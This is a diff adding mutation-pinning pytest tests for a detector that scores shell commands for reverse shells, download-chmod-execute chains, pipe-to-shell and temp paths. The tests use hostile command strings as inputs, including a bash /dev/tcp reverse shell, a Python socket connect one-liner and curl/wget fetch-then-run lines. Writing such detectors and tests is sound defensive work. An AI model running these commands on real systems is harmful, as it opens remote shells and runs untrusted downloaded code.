@@ -151,3 +151,59 @@ def test_patterns_with_nested_quantifiers_are_refused(monkeypatch):
     monkeypatch.setattr(cm, "_PATTERNS", [("bad", cm.ENCODED, 1, r"(a+)+")])
     with pytest.raises(AssertionError, match="nests quantifiers"):
         cm._compile()
+
+
+# ── Pinned by mutation testing: each test below kills a surviving mutant ────
+
+def test_weights_are_exactly_the_documented_ones():
+    w = {s.code: s.weight for s in cm.match(
+        "bash -i >& /dev/tcp/192.0.2.1/1 0>&1; curl -o /opt/u h; chmod +x /opt/u; /opt/u /tmp/x")}
+    assert w["dev_tcp"] == 40 and w["download_chmod_exec"] == 35 and w["tmp_path"] == 15
+    py = cm.match("python3 -c 'import socket;s=socket.socket();s.connect((1,2))'")
+    assert [(s.code, s.weight, s.family) for s in py] == [("python_socket", 40, cm.REVERSE_SHELL)]
+    long = cm.match("x" * (cm.MAX_INPUT_CHARS + 1))
+    assert (long[0].weight, long[0].offset) == (5, cm.MAX_INPUT_CHARS)
+    assert "only the first 16384 were checked" in long[0].excerpt
+
+
+def test_input_of_exactly_the_cap_is_checked_in_full():
+    tail = " bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"
+    text = "y" * (cm.MAX_INPUT_CHARS - len(tail)) + tail
+    assert len(text) == cm.MAX_INPUT_CHARS
+    codes = [s.code for s in cm.match(text)]
+    assert "input_truncated" not in codes and "dev_tcp" in codes
+
+
+def test_one_liners_need_a_connecting_call_not_just_the_word_socket():
+    assert cm.match("python3 -c 'import socket; print(socket.gethostname())'") == []
+    assert cm.match("perl -e 'use Socket; print 1'") == []
+    assert cm.match("php -r 'echo fsockopen;'") == []
+
+
+def test_crlf_continuations_are_joined():
+    codes = [s.code for s in cm.match("curl -s h/x | \\\r\n  bash")]
+    assert "pipe_to_interpreter" in codes
+
+
+def test_download_then_chmod_needs_the_same_file_name_and_a_later_run():
+    assert cm.match("curl -o /a/u h; chmod +x /b/v; /b/v") == []
+    hit = [s for s in cm.match("wget -O /x/y/u h && chmod +x /x/y/u && /x/y/u")
+           if s.code == "download_chmod_exec"]
+    assert hit and hit[0].offset == 0
+
+
+def test_excerpts_are_short_single_line_and_marked_when_cut():
+    text = "a" * 300 + "\n" + "curl h | sh" + "\n" + "b" * 300
+    s = next(s for s in cm.match(text) if s.code == "pipe_to_interpreter")
+    assert "\n" not in s.excerpt and len(s.excerpt) <= 200
+    tmp = next(s for s in cm.match("/tmp/x") if s.code == "tmp_path")
+    assert tmp.excerpt == "references /tmp, /var/tmp or /dev/shm" and tmp.offset == 0
+    assert len(cm._excerpt("z" * 500, 100, 400)) == 200
+    assert cm._excerpt("z" * 500, 100, 400).endswith("...")
+    assert cm._excerpt("abc\ndef", 0, 7) == "abc def"
+
+
+def test_compile_returns_one_compiled_pattern_per_entry():
+    compiled = cm._compile()
+    assert len(compiled) == len(cm._PATTERNS)
+    assert all(len(c) == 4 and hasattr(c[3], "finditer") for c in compiled)
